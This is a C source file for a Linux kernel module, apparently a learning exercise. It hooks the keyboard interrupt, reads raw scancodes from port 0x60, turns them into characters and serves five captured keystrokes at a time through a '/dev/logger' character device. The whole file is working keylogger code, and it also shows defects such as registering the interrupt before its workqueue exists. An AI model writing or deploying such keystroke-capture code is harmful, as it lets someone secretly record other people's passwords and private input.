#include<linux/kernel.h>
#include<linux/init.h>
#include<linux/module.h>
#include<linux/fs.h>
#include<linux/cdev.h>
#include<linux/device.h>
#include<linux/uaccess.h>
#include<linux/interrupt.h>
#include<linux/workqueue.h>
#include<linux/wait.h>
#include<asm/io.h>

#define KEYBOARD_IRQ 1
#define KBD_DATA_PORT 0x60
#define DEVICE_NAME  "logger"
#define max 5

static char log[max+1];
static dev_t dev;
static struct cdev my_cdev;
static struct class *my_class;

static int key_count=0;
// Add this prototype before usage:
static void my_work_func(struct work_struct *work);

static struct workqueue_struct *log_wq;
static DECLARE_DELAYED_WORK(work,my_work_func);
static DECLARE_WAIT_QUEUE_HEAD(my_queue);

static char scancode_to_ascii[128] = {
    [0x1E] = 'a', [0x30] = 'b', [0x2E] = 'c', [0x20] = 'd',
    [0x12] = 'e', [0x21] = 'f', [0x22] = 'g', [0x23] = 'h',
    [0x17] = 'i', [0x24] = 'j', [0x25] = 'k', [0x26] = 'l',
    [0x32] = 'm', [0x31] = 'n', [0x18] = 'o', [0x19] = 'p',
    [0x10] = 'q', [0x13] = 'r', [0x1F] = 's', [0x14] = 't',
    [0x16] = 'u', [0x2F] = 'v', [0x11] = 'w', [0x2D] = 'x',
    [0x15] = 'y', [0x2C] = 'z', [0x0B] = '0', [0x02] = '1',
    [0x03] = '2', [0x04] = '3', [0x05] = '4', [0x06] = '5',
    [0x07] = '6', [0x08] = '7', [0x09] = '8', [0x0A] = '9',
    [0x1C] = '\n', [0x39] = ' '
};

// read() waits for condition or signal
static ssize_t my_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    int ret;
    int len=strlen(log);

     if (*ppos >= len)
        return 0;  // EOF

    printk(KERN_INFO "logger: read() called, waiting...\n");

    ret = wait_event_interruptible(my_queue, key_count ==5);

    if (ret == -ERESTARTSYS) {
        printk(KERN_INFO "mychar: Interrupted by signal!\n");
        return -EINTR;
    }

    printk(KERN_INFO "logger: Condition met, returning data\n");
    if(copy_to_user(buf,log,len))
	    return -EFAULT;
    *ppos= *ppos+len;
    key_count=0;
    return len;
}
// --- Work Function ---
static void my_work_func(struct work_struct *work)
{
	
    unsigned char scancode = inb(KBD_DATA_PORT);

    if ((scancode & 0x80) == 0)  // Key press (not release)
    {
        if (key_count < max) {
            char ascii = scancode_to_ascii[scancode];

            if (ascii != 0) {
                log[key_count++] = ascii;
            }
        }

        if (key_count == max) {
            log[key_count] = '\0';  // Null-terminate the string
            wake_up_interruptible(&my_queue);
        }
    }
}
//interrupt handler
irqreturn_t keyboard_irq_handler(int irq,void *dev_id)
{
	 // Queue work with 0 delay
       queue_delayed_work(log_wq, &work, 0);
       return IRQ_HANDLED;
}
static struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = my_read,
};
static int __init keys_init(void)
{
    alloc_chrdev_region(&dev, 0, 1, DEVICE_NAME);
    cdev_init(&my_cdev, &fops);
    cdev_add(&my_cdev, dev, 1);

    my_class = class_create(DEVICE_NAME);
    device_create(my_class, NULL, dev, NULL, DEVICE_NAME);

        int result;
        printk(KERN_INFO "LOADING CUSTOM KEYBOARD_IRQ HANDLER---\n");

        // request irq keyboard interrupt
        result=request_irq(KEYBOARD_IRQ,keyboard_irq_handler,IRQF_SHARED,"keyboard_irq_handler",(void*)(keyboard_irq_handler));

        if(result)
        {
                printk(KERN_ERR "logger:cannot registr irq %d\n",KEYBOARD_IRQ);
                return result;
        }
        printk(KERN_INFO "logger:IRQ HANDLER REGISTERES SUCCESSFULLY\n");

         // Setup workqueue
        log_wq = alloc_workqueue("log_wq", WQ_UNBOUND, 0);
        //INIT_DELAYED_WORK(&work, my_work_func);

        return 0;

}
static void __exit keys_exit(void)
{
    free_irq(KEYBOARD_IRQ,(void*)(keyboard_irq_handler));
    device_destroy(my_class, dev);
    class_destroy(my_class);
    cdev_del(&my_cdev);
    unregister_chrdev_region(dev, 1);
    cancel_delayed_work_sync(&work);
    printk(KERN_INFO "logger: Module unloaded\n");

}
module_init(keys_init);
module_exit(keys_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("SOWMYA");

